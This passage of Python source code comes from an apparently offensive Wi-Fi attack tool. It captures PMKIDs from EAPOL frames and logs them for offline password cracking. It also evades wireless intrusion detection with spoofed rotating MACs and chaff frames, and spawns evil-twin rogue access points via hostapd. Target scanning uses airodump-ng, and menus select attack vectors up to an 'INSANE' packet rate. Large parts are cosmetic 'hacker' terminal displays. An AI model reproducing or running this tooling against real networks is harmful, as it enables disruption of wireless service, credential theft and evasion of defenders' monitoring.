    def _capture_loop(self):
        def process_pkt(pkt):
            if state.stop_event.is_set():
                return
            
            if EAPOL in pkt:
                try:
                    raw = bytes(pkt[EAPOL])
                    if len(raw) > 100:
                        idx = raw.find(b'\xDD\x14\x00\x0F\xAC')
                        if idx >= 0:
                            pmkid = raw[idx+4:idx+20]
                            bssid = pkt[Dot11].addr2
                            self.captured_pmkids.append({
                                'pmkid': pmkid.hex(),
                                'bssid': bssid,
                                'time': time.time()
                            })
                            self._log_pmkid(bssid, pmkid.hex())
                except Exception:
                    pass
            
            if Dot11 in pkt and pkt[Dot11].type == 2:
                addr1 = pkt[Dot11].addr1
                addr2 = pkt[Dot11].addr2
                for addr in [addr1, addr2]:
                    if addr and 'ff:ff:ff:ff:ff:ff' not in addr and '00:00:00:00:00:00' not in addr:
                        self.discovered_clients[addr] = time.time()
        
        try:
            sniff(iface=self.config.iface_primary,
                  prn=process_pkt,
                  store=False,
                  stop_filter=lambda _: state.stop_event.is_set())
        except Exception:
            pass
    
    def _log_pmkid(self, bssid, pmkid):
        if self.config.log_pmkid:
            fname = f"/tmp/csa_pmkid_{time.strftime('%Y%m%d')}.txt"
            with open(fname, 'a') as f:
                f.write(f"{bssid} * {pmkid}\n")


# ============================================================
#               EVASION ENGINE
# ============================================================

class EvasionEngine:
    """Intelligent evasion against WIDS/WIPS detection."""
    
    def __init__(self, config: AttackConfig):
        self.config = config
        self.rotation_pool = []
        self._build_mac_pool()
    
    def _build_mac_pool(self):
        oui_list = [
            "00:11:22", "00:1A:2B", "00:50:56", "00:0C:29",
            "00:1B:21", "00:1E:37", "00:1D:72", "08:00:27",
            "10:0D:7F", "18:03:73", "1C:1B:0D", "20:CF:30",
            "24:05:88", "28:10:7B", "2C:4D:54", "30:45:96",
            "34:23:BA", "38:68:DD", "3C:77:E6", "40:16:9E",
        ]
        for oui in oui_list:
            for _ in range(5):
                mac = f"{oui}:{random.randint(0,255):02x}:{random.randint(0,255):02x}:{random.randint(0,255):02x}"
                self.rotation_pool.append(mac)
    
    def get_rotated_mac(self):
        return random.choice(self.rotation_pool)
    
    def inject_chaff(self, iface, count=1):
        for _ in range(count):
            fake_src = self.get_rotated_mac()
            fake_dst = self.get_rotated_mac()
            pkt = (RadioTapEngine.make_radiotap() /
                   Dot11(type=2, subtype=0,
                         addr1=fake_dst, addr2=fake_src,
                         addr3=self.get_rotated_mac()) /
                   Raw(RandString(random.randint(40, 150))))
            try:
                sendp(pkt, iface=iface, count=1, verbose=False, monitor=True)
            except Exception:
                pass


# ============================================================
#               ROGUE AP MANAGER
# ============================================================

class RogueAPManager:
    """Manages rogue AP creation for Evil Twin attacks."""
    
    def __init__(self, config: AttackConfig, target: TargetAP):
        self.config = config
        self.target = target
        self.process = None
    
    def start(self):
        if not self.config.spawn_rogue:
            return
        
        new_ch = self.config.new_channel
        ssid = self.config.rogue_ssid or f"{self.target.ssid}_5G"
        iface = self.config.iface_secondary or self.config.iface_primary
        
        print(f"  {C.YELLOW}[*] Spawning rogue AP on ch {new_ch}...{R}")
        
        try:
            config_path = f"/tmp/csa_rogue_{int(time.time())}.conf"
            with open(config_path, 'w') as f:
                f.write(f"""interface={iface}
driver=nl80211
ssid={ssid}
hw_mode=g
channel={new_ch}
wpa=2
wpa_passphrase=password123
wpa_key_mgmt=WPA-PSK
rsn_pairwise=CCMP
""")
            
            self.process = subprocess.Popen(
                ["hostapd", config_path],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
            
            print(f"  {C.AQUA}[✓] Rogue AP '{ssid}' on ch {new_ch}{R}")
        except FileNotFoundError:
            print(f"  {C.YELLOW}⚠ hostapd not found, skipping rogue AP{R}")
        except Exception as e:
            print(f"  {C.YELLOW}⚠ Rogue AP error: {e}{R}")
    
    def stop(self):
        if self.process:
            self.process.terminate()
            try:
                self.process.wait(timeout=3)
            except Exception:
                self.process.kill()


# ============================================================
def spawn_hollywood_terminals(iface, bssid, ssid, curr_ch, new_ch):
    """Spawn 2 xterm terminals for Hollywood hacker effect.
    
    [FIX 9] Refactored to use temp script files instead of inline
    nested escaping which was extremely fragile.
    """
    try:
        subprocess.run(["which", "xterm"], capture_output=True, check=True)
    except Exception:
        print(f"  {C.YELLOW}⚠ xterm not found, skipping Hollywood terminals{R}")
        return
    
    try:
        # Terminal 1: Live packet monitor
        script1 = f'''#!/bin/bash
while true; do
    clear
    echo -e "\\033[38;5;45m╔══════════════════════════════════════════════════════════╗\\033[0m"
    echo -e "\\033[38;5;45m║           ⚡  CSA PACKET CAPTURE  ⚡                      ║\\033[0m"
    echo -e "\\033[38;5;45m╚══════════════════════════════════════════════════════════╝\\033[0m"
    echo
    echo -e "\\033[38;5;87m  Interface : {iface}\\033[0m"
    echo -e "\\033[38;5;87m  Target    : {bssid}\\033[0m"
    echo -e "\\033[38;5;87m  SSID      : \\"{ssid}\\"\\033[0m"
    echo -e "\\033[38;5;87m  Channel   : {curr_ch} → {new_ch}\\033[0m"
    echo
    echo -e "\\033[38;5;45m─── LIVE FEED ───────────────────────────────────────────\\033[0m"
    timeout 0.3 tshark -i {iface} -Y "wlan.fc.type_subtype==8" -T fields \\
        -e frame.time_relative -e wlan.sa -e wlan.bssid 2>/dev/null | \\
        awk '{{printf "\\033[38;5;117m[%s]\\033[0m \\033[38;5;51mTX\\033[0m → \\033[38;5;45m%s\\033[0m \\033[38;5;33m[BSSID: %s]\\033[0m\\n", $1, $2, $3}}'
    sleep 0.5
done
'''
        path1 = f"/tmp/csa_term1_{int(time.time())}.sh"
        with open(path1, 'w') as f:
            f.write(script1)
        os.chmod(path1, 0o755)
        
        cmd1 = f'xterm -T "⚡ CSA PACKET MONITOR" -geometry 100x20+0+0 -bg "#000510" -fg "#00bfff" -fa "Monospace" -fs 9 -e bash {path1} &'
        subprocess.Popen(cmd1, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        time.sleep(0.5)
        
        # Terminal 2: Matrix rain
        script2 = f'''#!/bin/bash
chars=(A B C D E F 0 1 2 3 4 5 6 7 8 9 ア イ ウ エ オ カ キ ク ケ コ)
while true; do
    clear
    echo -e "\\033[38;5;45m╔════════════════════════════════════╗\\033[0m"
    echo -e "\\033[38;5;45m║      ◈  CHANNEL MATRIX  ◈        ║\\033[0m"
    echo -e "\\033[38;5;45m╚════════════════════════════════════╝\\033[0m"
    echo
    ch=$(iw dev {iface} info 2>/dev/null | grep channel | awk '{{print $2}}')
    echo -e "\\033[38;5;87m  Current Channel : \\033[38;5;51m$ch\\033[0m"
    echo -e "\\033[38;5;87m  Target Channel  : \\033[38;5;196m{curr_ch}\\033[0m"
    echo -e "\\033[38;5;87m  New Channel     : \\033[38;5;82m{new_ch}\\033[0m"
    echo
    echo -e "\\033[38;5;45m─── MATRIX RAIN ───────────────────\\033[0m"
    for ((i=0; i<12; i++)); do
        row=""
        for ((j=0; j<30; j++)); do
            r=$((RANDOM % 5))
            if [ $r -eq 0 ]; then
                idx=$((RANDOM % ${{#chars[@]}}))
                c=$((RANDOM % 40 + 20))
                row="${{row}}\\033[38;5;${{c}}m${{chars[$idx]}}\\033[0m"
            else
                row="${{row}} "
            fi
        done
        echo -e "  $row"
    done
    echo
    echo -e "\\033[38;5;45m──────────────────────────────────\\033[0m"
    echo -e "\\033[38;5;240m[Ctrl+C to close]\\033[0m"
    sleep 0.15
done
'''
        path2 = f"/tmp/csa_term2_{int(time.time())}.sh"
        with open(path2, 'w') as f:
            f.write(script2)
        os.chmod(path2, 0o755)
        
        cmd2 = f'xterm -T "🌀 MATRIX OVERLAY - CHANNEL MONITOR" -geometry 60x25+1010+0 -bg "#000510" -fg "#0088ff" -fa "Monospace" -fs 9 -e bash {path2} &'
        subprocess.Popen(cmd2, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        
    except Exception as e:
        print(f"  {C.YELLOW}⚠ Terminal spawn error: {e}{R}")


# ============================================================
#               HOLOGRAM DISPLAY ENGINE
# ============================================================

class HologramDisplay:
    """Quantum holographic display with real-time telemetry."""
    
    def __init__(self, config: AttackConfig, target: TargetAP,
                 refresh_rate: float = 0.1, stats_file: str = ""):
        self.config = config
        self.target = target
        self.spi = 0
        self.pui = 0
        self.refresh_rate = max(0.05, refresh_rate)
        self.stats_file = stats_file
    
    def start(self):
        t = Thread(target=self._display_loop, daemon=True)
        t.start()
        return t
    
    def _format_rate(self, elapsed, count):
        if elapsed > 0:
            rate = count / elapsed
            if rate >= 1000:
                return f"{C.ICE}{rate/1000:.2f}K{R}{C.GRAY} pps{R}"
            return f"{C.AQUA}{rate:.1f}{R}{C.GRAY} pps{R}"
        return f"{C.GRAY}0 pps{R}"
    
    def _format_pkt(self, n):
        s = f"{n:,}"
        colors = [C.CYAN, C.AQUA, C.ICE, C.WHITE_B, C.GLACIER, C.ELECTRIC, C.LIGHT_B, C.SKY]
        result = ""
        for i, ch in enumerate(s):
            if ch == ',':
                result += f"{C.GRAY},{R}"
            else:
                result += colors[i % len(colors)] + ch + R
        return result
    
    def _blue_bar(self, value, max_val=1000, width=36):
        filled = min(int(width * value / max_val), width)
        empty = width - filled
        bar = ""
        for i in range(width):
            if i < filled:
                if i < width // 3:
                    bar += f"{C.NAVY}█{R}"
                elif i < width * 2 // 3:
                    bar += f"{C.TRUE_B}█{R}"
                else:
                    bar += f"{C.SKY}█{R}"
            else:
                bar += f"{C.DIM_GRAY}░{R}"
        return bar
    
    def _display_loop(self):
        sys.stdout.write('\033[?25l\033[2J\033[H')
        
        while not state.stop_event.is_set():
            elapsed = time.time() - state.start_time
            h, m = int(elapsed // 3600), int((elapsed % 3600) // 60)
            s = int(elapsed % 60)
            ts = f"{h:02d}:{m:02d}:{s:02d}"
            
            sent, failed = state.get_stats()
            total = sent + failed
            sc = (sent / total * 100) if total > 0 else 100
            
            sp = SPINNER[self.spi % len(SPINNER)]
            pu = PULSE[self.pui % len(PULSE)]
            rt = self._format_rate(elapsed, sent)
            rate_val = sent / elapsed if elapsed > 0.01 else 0.0
            
            sc_color = C.AQUA if sc >= 99 else (C.SKY if sc >= 90 else C.RED)
            
            try:
                tsize = shutil.get_terminal_size(fallback=(80, 24))
                tw, th = tsize.columns, tsize.lines
            except (ValueError, OSError):
                tw, th = 80, 24
            
            out = []
            
            if th > 45:
                out.extend([f"{C.BG_DARK}{line}{R}"
                           for line in BANNER.strip('\n').split('\n')])
                out.append("")
            
            out.append(f"  {C.DEEP_B}╔{'═'*56}╗{R}")
            out.append(f"  ║{C.ELECTRIC}{B}         ◈  QUANTUM STATUS MATRIX  ◈         {R}{C.DEEP_B}║{R}")
            out.append(f"  {C.DEEP_B}╠{'═'*56}╣{R}")
            
            rows = [
                (f"{SYM.BOLT} INTERFACE", self.config.iface_primary, C.AQUA),
                (f"{SYM.TARGET} TARGET", f"{self.target.bssid}", C.ICE),
                (f"{SYM.DOT} SSID", f'"{self.target.ssid}"', C.WHITE_B),
                (f"{SYM.ARROW} CHANNEL",
                 f"{C.RED}{self.target.channel}{R} {C.DIM_GRAY}→{R} {C.AQUA}{self.config.new_channel}", C.LIGHT_B),
                (f"{SYM.WAVE} MODE",
                 f"{C.CYAN}{self.config.mode.name}{R} {'(DUAL)' if self.config.use_dual_radio else ''}", C.SUCCESS),
                (f"{SYM.HEX} VECTORS",
                 f"{C.ICE}{', '.join(v.value for v in self.config.vectors)}{R}", C.WHITE_B),
            ]
            
            for label, val, vc in rows:
                display = f"{vc}{val}{R}"
                pad = 56 - len(label) - 4 - len(str(val))
                out.append(f"  ║ {C.SKY}{label}{R} {C.DIM_GRAY}:{R} {display}{' '*max(0,pad)}║")
            
            out.append(f"  {C.DEEP_B}╠{'═'*56}╣{R}")
            out.append(f"  ║{C.AQUA}{B}           ◈  LIVE TELEMETRY  ◈            {R}{C.DEEP_B}║{R}")
            out.append(f"  {C.DEEP_B}╠{'═'*56}╣{R}")
            
            metrics = [
                (f"{SYM.BOLT} PACKETS", self._format_pkt(sent), C.WHITE_B),
                (f"{SYM.RADAR} RATE", rt, C.AQUA),
                (f"{SYM.CROSS} FAILURES", f"{C.RED if failed > 0 else C.GRAY}{failed}{R}", C.RED if failed > 0 else C.GRAY),
                (f"{SYM.TARGET} ELAPSED", ts, C.ICE),
                (f"{SYM.CHECK} SUCCESS", f"{sc_color}{sc:.2f}%{R}", sc_color),
                (f"{SYM.EYE} PKTS/SEC", f"{C.ICE}{rate_val:.1f}{R}", C.ICE),
            ]
            
            for label, val, vc in metrics:
                display = f"{vc}{val}{R}"
                pad = 56 - len(label) - 4 - len(str(val).replace('\033', '').replace('[38;5;', '').replace('m', ''))
                out.append(f"  ║ {C.SKY}{label}{R} {C.DIM_GRAY}:{R} {display}{' '*max(0,pad)}║")
            
            if th > 28:
                out.append(f"  {C.DEEP_B}╠{'═'*56}╣{R}")
                out.append(f"  ║{C.AQUA}{B}           ◈  TX BUFFER MONITOR  ◈         {R}{C.DEEP_B}║{R}")
                out.append(f"  {C.DEEP_B}╠{'═'*56}╣{R}")
                bar = self._blue_bar(sent % 1000, 1000)
                out.append(f"  ║  {C.DIM_GRAY}[{R}{bar}{C.DIM_GRAY}]{R}  {pu}  {C.GRAY}[{C.ICE}{rate_val:.0f}/{self.config.get_params()['count']*10:.0f} pps{C.GRAY}]{R}    ║")
            
            if th > 35:
                out.append(f"  {C.DEEP_B}╠{'═'*56}╣{R}")
                out.append(f"  ║{C.AQUA}{B}           ◈  VECTOR ACTIVITY  ◈            {R}{C.DEEP_B}║{R}")
                out.append(f"  {C.DEEP_B}╠{'═'*56}╣{R}")
                for vec in self.config.vectors:
                    active = random.random() > 0.3
                    status = f"{C.AQUA}ACTIVE{R}" if active else f"{C.DIM_GRAY}IDLE{R}"
                    sym = f"{C.GREEN}●{R}" if active else f"{C.DIM_GRAY}○{R}"
                    pad = 56 - len(vec.value) - 10
                    out.append(f"  ║  {sym} {C.WHITE}{vec.value}{R} {C.DIM_GRAY}:{R} {status}{' '*max(0,pad)}║")
            
            out.append(f"  {C.DEEP_B}╚{'═'*56}╝{R}")
            out.append("")
            
            if th > 20:
                scan_pos = (self.spi % 25)
                scan_line = f"{C.ICE}{'▔'*scan_pos}{R}{C.WHITE}⚡{R}{C.DIM_GRAY}{'▔'*(25-scan_pos)}{R}"
                out.append(f"     {C.DIM}SCAN{R} {scan_line}")
            
            if th > 5:
                out.append(f"")
                out.append(f"  {C.DIM_GRAY}{'═'*60}{R}")
                out.append(f"  {C.DIM_GRAY}[{C.RED}Ctrl+C{R}{C.DIM_GRAY}]{R} {C.CYAN}Terminate{R}  "
                          f"{C.DIM_GRAY}[{C.AQUA}TX{R}{C.DIM_GRAY}]{R} {C.ICE}{sent:,}{R}  "
                          f"{C.DIM_GRAY}[{C.AQUA}{rate_val:.0f} pps{R}{C.DIM_GRAY}]{R}  "
                          f"{C.DIM_GRAY}[{C.GREEN}↑{sc:.0f}%{R}{C.DIM_GRAY}]{R}")
                out.append(f"  {C.DIM_GRAY}{'═'*60}{R}")
            
            sys.stdout.write('\033[H')
            lines_to_print = out[:th-1]
            for i, line in enumerate(lines_to_print):
                if i == len(lines_to_print) - 1:
                    sys.stdout.write(line + '\033[K\033[J')
                else:
                    sys.stdout.write(line + '\033[K\n')
            sys.stdout.flush()
            
            self.spi += 1
            self.pui += 1
            
            if self.stats_file:
                try:
                    stats_data = {
                        "timestamp": time.time(),
                        "elapsed_seconds": elapsed,
                        "packets_sent": sent,
                        "packets_failed": failed,
                        "rate_pps": round(rate_val, 2),
                        "success_rate": round(sc, 2),
                        "target_bssid": self.target.bssid,
                        "target_ssid": self.target.ssid,
                        "target_channel": self.target.channel,
                        "mode": self.config.mode.name,
                        "vectors": [v.value for v in self.config.vectors],
                    }
                    with open(self.stats_file, 'w') as sf:
                        json.dump(stats_data, sf, indent=2)
                except Exception:
                    pass
            
            time.sleep(self.refresh_rate)


# ============================================================
#               TARGET SCANNER
# ============================================================

class TargetScanner:
    """Intelligent AP and client scanner."""
    
    @staticmethod
    def detect_monitor_interfaces():
        ifaces = []
        try:
            r = subprocess.run(["iw", "dev"], capture_output=True, text=True, timeout=5)
            current = None
            for line in r.stdout.splitlines():
                line = line.strip()
                if line.startswith("Interface"):
                    current = line.split()[-1]
                elif line.startswith("type") and current:
                    if line.split()[-1] == "monitor":
                        ifaces.append(current)
                    current = None
        except Exception:
            pass
        return ifaces
    
    @staticmethod
    def scan_aps(iface, duration=12):
        tmpdir = tempfile.mkdtemp(prefix="csa_scan_")
        prefix = os.path.join(tmpdir, "scan")
        aps = []
        
        try:
            proc = subprocess.Popen(
                ["airodump-ng", iface, "-w", prefix,
                 "--output-format", "csv", "--write-interval", "1"],
                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
            )
            
            for i in range(duration):
                if state.stop_event.is_set():
                    break
                bar_w = 32
                filled = int((i + 1) / duration * bar_w)
                bar = f"{C.BLUE}{'█'*filled}{C.DIM_GRAY}{'░'*(bar_w-filled)}{R}"
                sys.stdout.write(f"\r  {SYM.RADAR} {C.GRAY}[{bar}]{R} {C.ICE}{i+1}/{duration}s{R} {C.CYAN}scanning{R} ")
                sys.stdout.flush()
                time.sleep(1)
            
            proc.terminate()
            try:
                proc.wait(timeout=3)
            except Exception:
                pass
            print()
        except FileNotFoundError:
            print(f"\n  {C.YELLOW}⚠ airodump-ng not found{R}")
            try:
                os.rmdir(tmpdir)
            except Exception:
                pass
            return []
        except Exception as e:
            print(f"\n  {C.YELLOW}⚠ Scan error: {e}{R}")
            try:
                proc.terminate()
            except Exception:
                pass
            return []
        
        csv_file = prefix + "-01.csv"
        if not os.path.isfile(csv_file):
            print(f"  {C.YELLOW}⚠ No scan results{R}")
            return []
        
        try:
            with open(csv_file, 'r', errors='replace') as f:
                section = "header"
                for line in f:
                    line = line.strip()
                    if not line:
                        continue
                    if line.startswith("BSSID"):
                        section = "ap"
                        continue
                    if line.startswith("Station MAC"):
                        break
                    if section == "ap":
                        parts = [p.strip() for p in line.split(',')]
                        if len(parts) < 11:
                            continue
                        bssid = parts[0]
                        if not validate_mac(bssid):
                            continue
                        channel = parts[3].strip() if len(parts) > 3 else '1'
                        power = parts[8].strip() if len(parts) > 8 else '-100'
                        enc = parts[5].strip() if len(parts) > 5 else ''
                        essid = parts[13].strip() if len(parts) > 13 else ''
                        if not essid and len(parts) > 11:
                            essid = parts[-1].strip()
                        if essid:
                            aps.append(TargetAP(
                                bssid=bssid, ssid=essid,
                                channel=int(channel) if channel.isdigit() else 1,
                                encryption=enc,
                                power=int(power) if power.lstrip('-').isdigit() else -100
                            ))
        except Exception as e:
            print(f"  {C.YELLOW}⚠ Parse error: {e}{R}")
        
        try:
            for f in glob.glob(prefix + "*"):
                os.remove(f)
            os.rmdir(tmpdir)
        except Exception:
            pass
        
        aps.sort(key=lambda x: x.power, reverse=True)
        return aps


# ============================================================
#               VALIDATION
# ============================================================

def validate_mac(mac):
    return bool(re.match(r'^([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})$', mac))

def validate_channel(ch):
    try:
        ch = int(ch)
        return (1 <= ch <= 14) or (36 <= ch <= 165)
    except Exception:
        return False

def get_input(prompt, validator=None, error_msg="Invalid!", default=None):
    while True:
        try:
            p = f"  {C.ELECTRIC}{SYM.ARROW}{R} {C.LIGHT_B}{prompt}{R}"
            if default:
                p += f" {C.GRAY}[{default}]{R}"
            p += " "
            val = input(p).strip()
            if not val and default:
                val = default
            if not val:
                print(f"     {SYM.CROSS} {C.ERROR}{error_msg}{R}")
                continue
            if validator and not validator(val):
                print(f"     {SYM.CROSS} {C.ERROR}{error_msg}{R}")
                continue
            return val
        except (KeyboardInterrupt, EOFError):
            print(f"\n  {C.YELLOW}Aborted.{R}")
            sys.exit(0)


# ============================================================
#               MENU & SELECTION INTERFACES
# ============================================================

def select_interface(auto=None):
    if auto:
        return auto
    
    print(f"\n  {C.CYAN}{B}{SYM.RADAR} INTERFACE DETECTION{R}\n")
    ifaces = TargetScanner.detect_monitor_interfaces()
    
    if not ifaces:
        print(f"  {C.YELLOW}⚠ No monitor interfaces detected.{R}")
        print(f"  {C.GRAY}  Enable: airmon-ng start wlan0{R}\n")
        return get_input("Monitor Interface", error_msg="Required!")
    
    print(f"  {C.DIM_GRAY}┌{'─'*42}┐{R}")
    print(f"  │{C.AQUA}{B}  MONITOR INTERFACES{R}{' '*21}│")
    print(f"  {C.DIM_GRAY}├{'─'*42}┤{R}")
    for i, ifc in enumerate(ifaces, 1):
        print(f"  │  {C.CYAN}{i}{R}{C.GRAY}.{R} {C.ICE}{ifc:<36}{R}│")
    print(f"  {C.DIM_GRAY}└{'─'*42}┘{R}\n")
    
    if len(ifaces) == 1:
        print(f"  {C.AQUA}◆ Auto-selected: {C.ICE}{ifaces[0]}{R}\n")
        return ifaces[0]
    
    while True:
        try:
            sel = input(f"  {C.ELECTRIC}▸{R} {C.LIGHT_B}Select [1-{len(ifaces)}]{R}: ").strip()
            idx = int(sel) - 1
            if 0 <= idx < len(ifaces):
                return ifaces[idx]
        except (ValueError, KeyboardInterrupt, EOFError):
            pass
        print(f"  {C.RED}Invalid.{R}")


def select_target(iface):
    print(f"\n  {C.CYAN}{B}[✎] TARGET ACQUISITION{R}\n")
    
    try:
        scan_choice = input(f"  {C.ELECTRIC}▸{R} {C.LIGHT_B}Auto-scan APs?{R} {C.AQUA}(Y/n){R}: ").strip().lower()
    except (KeyboardInterrupt, EOFError):
        print(f"\n  {C.YELLOW}Aborted.{R}")
        sys.exit(0)
    
    aps = []
    if scan_choice != 'n':
        print(f"\n  {C.CYAN}{B}{SYM.RADAR} SCANNING ACCESS POINTS{R}\n")
        aps = TargetScanner.scan_aps(iface)
    
    if not aps:
        if scan_choice != 'n':
            print(f"  {C.YELLOW}⚠ No APs found. Manual input.\n{R}")
        bssid = get_input("Target BSSID", validate_mac, "Invalid MAC!")
        ssid = get_input("Target SSID", error_msg="Required!")
        ch = get_input("Channel", validate_channel, "Invalid! (1-14 / 36-165)")
        return TargetAP(bssid=bssid, ssid=ssid, channel=int(ch))
    
    print(f"\n  {C.DIM_GRAY}┌{'─'*66}┐{R}")
    print(f"  │{C.AQUA}{B}  #   BSSID              CH  PWR  ENC       ESSID{R}{' '*15}│")
    print(f"  {C.DIM_GRAY}├{'─'*66}┤{R}")
    
    for i, ap in enumerate(aps[:25], 1):
        pwr = ap.power
        if abs(pwr) < 50:
            pwr_c = C.GREEN
        elif abs(pwr) < 70:
            pwr_c = C.YELLOW
        else:
            pwr_c = C.RED
        
        enc = ap.encryption[:9]
        essid = ap.ssid[:22]
        print(f"  │  {C.CYAN}{i:>2}{R}  {C.ICE}{ap.bssid}{R}  "
              f"{C.SKY}{ap.channel:>3}{R}  {pwr_c}{pwr:>4}{R}  "
              f"{C.PURPLE}{enc:<9}{R} {C.WHITE_B}{essid}{R}{' '*max(0,22-len(essid))}│")
    
    print(f"  {C.DIM_GRAY}├{'─'*66}┤{R}")
    print(f"  │  {C.GRAY} 0  = Manual input{R}{' '*46}│")
    print(f"  {C.DIM_GRAY}└{'─'*66}┘{R}\n")
    
    while True:
        try:
            sel = input(f"  {C.ELECTRIC}▸{R} {C.LIGHT_B}Select [0-{min(len(aps),25)}]{R}: ").strip()
            idx = int(sel)
            if idx == 0:
                bssid = get_input("Target BSSID", validate_mac, "Invalid MAC!")
                ssid = get_input("Target SSID", error_msg="Required!")
                ch = get_input("Channel", validate_channel, "Invalid!")
                return TargetAP(bssid=bssid, ssid=ssid, channel=int(ch))
            if 1 <= idx <= min(len(aps), 25):
                return aps[idx - 1]
        except (ValueError, KeyboardInterrupt, EOFError):
            pass
        print(f"  {C.RED}Invalid.{R}")


def select_vectors():
    print(f"\n  {C.DIM_GRAY}┌{'─'*56}┐{R}")
    print(f"  │{C.AQUA}{B}  ◈  ATTACK VECTOR SELECTION  ◈{R}{' '*24}│")
    print(f"  {C.DIM_GRAY}├{'─'*56}┤{R}")
    
    vectors = list(AttackVector)
    for i, vec in enumerate(vectors, 1):
        print(f"  │  {C.CYAN}{i:>2}{R}{C.GRAY}.{R} {C.ICE}{vec.value:<32}{R}{' '*2}│")
    
    print(f"  {C.DIM_GRAY}├{'─'*56}┤{R}")
    print(f"  │  {C.CYAN} A{R}{C.GRAY}.{R} {C.AQUA}ALL VECTORS{R}{' '*37}│")
    print(f"  │  {C.CYAN} 0{R}{C.GRAY}.{R} {C.YELLOW}Custom (will prompt){R}{' '*28}│")
    print(f"  {C.DIM_GRAY}└{'─'*56}┘{R}\n")
    
    while True:
        try:
            sel = input(f"  {C.ELECTRIC}▸{R} {C.LIGHT_B}Select{R} {C.GRAY}[1,3,7 or 1-5,8-10 or A]{R}: ").strip()
            if sel.upper() == 'A':
                return list(vectors)
            if sel == '0':
                return select_custom_vectors(vectors)
            
            selected = set()
            parts = sel.replace(' ', '').split(',')
            for part in parts:
                if '-' in part:
                    a, b = part.split('-')
                    for x in range(int(a), int(b)+1):
                        if 1 <= x <= len(vectors):
                            selected.add(x)
                else:
                    x = int(part)
                    if 1 <= x <= len(vectors):
                        selected.add(x)
            
            if selected:
                return [vectors[i-1] for i in sorted(selected)]
        except (ValueError, KeyboardInterrupt, EOFError):
            pass
        print(f"  {C.RED}Invalid selection.{R}")


def select_custom_vectors(vectors):
    selected = []
    print(f"\n  {C.YELLOW}Select vectors individually (y/n for each):{R}\n")
    for vec in vectors:
        while True:
            try:
                ans = input(f"  {C.ELECTRIC}▸{R} {C.ICE}{vec.value:<32}{R} {C.GRAY}[y/n]{R}: ").strip().lower()
                if ans == 'y':
                    selected.append(vec)
                    break
                elif ans == 'n':
                    break
            except (KeyboardInterrupt, EOFError):
                print(f"\n  {C.YELLOW}Aborted.{R}")
                sys.exit(0)
    if not selected:
        print(f"  {C.YELLOW}⚠ No vectors selected, using CSA Beacon only.{R}")
        selected = [AttackVector.CSA_BEACON]
    return selected


def select_attack_mode():
    print(f"\n  {C.DIM_GRAY}┌{'─'*44}┐{R}")
    print(f"  │{C.AQUA}{B}  ◈  AGGRESSIVENESS LEVEL  ◈{R}{' '*15}│")
    print(f"  {C.DIM_GRAY}├{'─'*44}┤{R}")
    
    modes = [
        (1, "STEALTH", C.GREEN_D,  "~20 pps, max evasion"),
        (2, "LOW", C.SKY,          "~50 pps, balanced evas"),
        (3, "MEDIUM", C.YELLOW,    "~200 pps, standard"),
        (4, "HIGH", C.ORANGE,      "~500 pps, aggressive"),
        (5, "INSANE", C.RED,       "~2000+ pps, MAX FIRE"),
    ]
    
    for num, name, color, desc in modes:
        bar_len = num * 5
        bar = f"{color}{'█'*bar_len}{C.DIM_GRAY}{'░'*(25-bar_len)}{R}"
        print(f"  │  {C.CYAN}{num}{R}{C.GRAY}.{R} {color}{name:<8}{R} [{bar}] {C.GRAY}{desc}{R} │")
    
    print(f"  {C.DIM_GRAY}└{'─'*44}┘{R}\n")
    
    while True:
        try:
            sel = input(f"  {C.ELECTRIC}▸{R} {C.LIGHT_B}Level [1-5]{R} {C.GRAY}[3]{R}: ").strip()
            if not sel:
                return AttackMode.MEDIUM
            sel = int(sel)
            if 1 <= sel <= 5:
                mode = AttackMode(sel)
                print(f"  {C.CYAN}◆ {mode.name} mode activated{R}\n")
                return mode
        except (ValueError, KeyboardInterrupt, EOFError):
            pass
        print(f"  {C.RED}Invalid.{R}")


# ============================================================
#               HOLOGRAM EXIT SEQUENCE
# ============================================================

def holo_exit(iface, bssid, ssid, curr_ch, new_ch):
    sys.stdout.write('\033[?25h\033[2J\033[H')
    
    elapsed = time.time() - state.start_time
    h, m = int(elapsed // 3600), int((elapsed % 3600) // 60)
    s = int(elapsed % 60)
    ts = f"{h:02d}:{m:02d}:{s:02d}"
    sent, failed = state.get_stats()
    total = sent + failed
    sc = (sent / total * 100) if total > 0 else 0
    rate_val = sent / elapsed if elapsed > 0 else 0
    
    lines = [
        f"\n{C.DEEP_B}  ╔══════════════════════════════════════════════════╗{R}",
        f"{C.AQUA}{B}  ║          ●  SESSION TERMINATED  ●              ║{R}",
        f"{C.DEEP_B}  ╚══════════════════════════════════════════════════╝{R}",
        "",
        f"  {C.DEEP_B}╔{'═'*52}╗{R}",
        f"  ║{C.AQUA}{B}  NEBULA ATTACK SUMMARY{R}{' '*27}{C.DEEP_B}║{R}",
        f"  {C.DEEP_B}╠{'═'*52}╣{R}",
        f"  ║ {C.SKY}Interface{R}  {C.DIM_GRAY}:{R} {C.CYAN}{iface:<41}{R} ║",
        f"  ║ {C.SKY}Target{R}     {C.DIM_GRAY}:{R} {C.ICE}{bssid:<41}{R} ║",
        f"  ║ {C.SKY}SSID{R}       {C.DIM_GRAY}:{R} {C.WHITE_B}{ssid:<41}{R} ║",
        f"  ║ {C.SKY}Channel{R}    {C.DIM_GRAY}:{R} {C.RED}{curr_ch}{R} {C.DIM_GRAY}→{R} {C.AQUA}{new_ch}{R}                   ║",
        f"  ║ {C.SKY}Duration{R}   {C.DIM_GRAY}:{R} {C.ICE}{ts:<41}{R} ║",
        f"  {C.DEEP_B}╠{'═'*52}╣{R}",
        f"  ║ {C.SKY}Total Packets{R} {C.DIM_GRAY}:{R} {C.AQUA}{sent:,}{R}{' '*30}║",
        f"  ║ {C.SKY}Avg Rate{R}     {C.DIM_GRAY}:{R} {C.ICE}{rate_val:<8.1f} pps{R}{' '*23}║",
        f"  ║ {C.SKY}Success Rate{R}  {C.DIM_GRAY}:{R} {C.AQUA if sc >= 90 else C.RED}{sc:.1f}%{R}{' '*31}║",
        f"  ║ {C.SKY}Failures{R}     {C.DIM_GRAY}:{R} {C.RED if failed > 0 else C.GRAY}{failed}{R}{' '*35}║",
        f"  {C.DEEP_B}╚{'═'*52}╝{R}",
        "",
